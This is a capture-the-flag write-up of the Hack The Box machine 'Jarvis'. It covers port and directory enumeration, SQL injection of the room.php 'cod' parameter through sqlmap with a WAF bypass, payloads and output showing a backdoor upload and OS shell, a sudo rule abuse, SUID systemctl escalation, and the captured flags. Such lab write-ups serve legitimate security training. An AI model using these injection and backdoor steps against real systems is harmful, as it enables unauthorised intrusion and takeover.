# Jarvis
>Author : Xyan1d3
>Date : 7th July 2021
>IP : 10.10.10.143
>OS : Linux
>Difficulty : Medium
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Wed Jul  7 00:51:04 2021 as: nmap -sC -sV -v -oN nmap/jarvis 10.10.10.143
Nmap scan report for 10.10.10.143
Host is up (0.063s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Nmap all ports without scripts
```sql
# Nmap 7.91 scan initiated Wed Jul  7 00:51:44 2021 as: nmap -p- -v -oN nmap/jarvis-allports 10.10.10.143
Nmap scan report for 10.10.10.143
Host is up (0.063s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
64999/tcp open  unknown
```

## Nmap all open tcp ports with scripts
```sql
# Nmap 7.91 scan initiated Wed Jul  7 00:53:25 2021 as: nmap -p22,80,64999 -A -v -oN nmap/deep-scan 10.10.10.143
Nmap scan report for 10.10.10.143
Host is up (0.061s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   62.20 ms 10.10.14.1
2   61.14 ms 10.10.10.143
```

## Gobuster
```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/jarvis]
└──╼ # gobuster dir -u http://10.10.10.143/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster80.out -x php,txt -t 100
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.143/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
2021/07/07 00:55:22 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.10.143/images/]
/index.php            (Status: 200) [Size: 23628]                                
/nav.php              (Status: 200) [Size: 1333]                                 
/footer.php           (Status: 200) [Size: 2237]                                 
/css                  (Status: 301) [Size: 310] [--> http://10.10.10.143/css/]   
/js                   (Status: 301) [Size: 309] [--> http://10.10.10.143/js/]    
/fonts                (Status: 301) [Size: 312] [--> http://10.10.10.143/fonts/] 
/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.10.143/phpmyadmin/]
/connection.php       (Status: 200) [Size: 0]
/room.php             (Status: 302) [Size: 3024] [--> index.php]
/sass                 (Status: 301) [Size: 311] [--> http://10.10.10.143/sass/]
/server-status        (Status: 403) [Size: 300]
```

# Initial FootHold as www-data
We visit the site and find out that we have a hotel booking catalog.
![[Pasted image 20210707012551.png]]

The `http://10.10.10.143/room.php?cod=1` page has a parameter `cod` is sql injectible.
But, We have a `WAF` in play which blocks any us for `90` seconds if it sees a request with useragent `sqlmap`.
We need to add `--random-agent` for using random user-agent.

```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/jarvis]
└──╼ # sqlmap -u http://10.10.10.143/room.php?cod=1 --batch --random-agent --os-shell

*** SNIP ***

sqlmap resumed the following injection point(s) from stored session:

---                                                                                 
Parameter: cod (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cod=1 AND 5046=5046
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)              
    Payload: cod=1 AND (SELECT 8456 FROM (SELECT(SLEEP(5)))SHbk)
    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: cod=-6676 UNION ALL SELECT NULL,NULL,CONCAT(0x71787a6271,0x46676156447850715242586668526242444e5a554a4d4375555768776e79617776576562414e714a,0x71787a7171),NU
LL,NULL,NULL,NULL-- -
---
[01:31:33] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9 (stretch)
web application technology: PHP, Apache 2.4.25
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[01:31:33] [INFO] retrieved web server absolute paths: '/images/'
[01:31:33] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
[01:31:34] [WARNING] unable to upload the file stager on '/var/www/'
[01:31:34] [INFO] trying to upload the file stager on '/var/www/' via UNION method
[01:31:34] [WARNING] expect junk characters inside the file as a leftover from UNION query
[01:31:35] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
[01:31:35] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
[01:31:35] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://10.10.10.143:80/tmpueokp.php
[01:31:36] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://10.10.10.143:80/tmpbpubb.php
[01:31:36] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> id
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
```

We could now issue a reverse shell and get a proper shell.
![[Pasted image 20210707013459.png]]

# User Escalation as pepper
The user `www-data` has a sudo `nopasswd` rule.
```python
www-data@jarvis:/var/www$ sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

![[Pasted image 20210707020009.png]]

We have to get a reverse shell from the spawned bash as it tends to not return any output for a command.

## Getting the user Flag
```python
pepper@jarvis:/var/www$ cd /home/pepper/
pepper@jarvis:~$ ls -l
total 8
drwxr-xr-x 3 pepper pepper 4096 Mar  4  2019 Web
-r--r----- 1 root   pepper   33 Mar  5  2019 user.txt
pepper@jarvis:~$ cat user.txt 
2afa36c4f05b37b34259c93551f5c44f
```

# Root Escalation
On, Checking all the suid binaries on this box we find out that we have a setuid bit set on the `systemctl` binary.
```python
pepper@jarvis:~$ find / -perm /4000 2> /dev/null
/bin/fusermount
/bin/mount
/bin/ping
/bin/systemctl
/bin/umount
/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

We create a service and start it to get a shell in the box.
![[Pasted image 20210707021715.png]]

## Getting Root Flag
```python
root@jarvis:/# cd /root/
root@jarvis:/root# ls -l
total 16
-rwxr--r-- 1 root root   42 Mar  4  2019 clean.sh
-r-------- 1 root root   33 Mar  5  2019 root.txt
-rwxr-xr-x 1 root root 5271 Mar  5  2019 sqli_defender.py
root@jarvis:/root# cat root.txt 
d41d8cd98f00b204e9800998ecf84271
```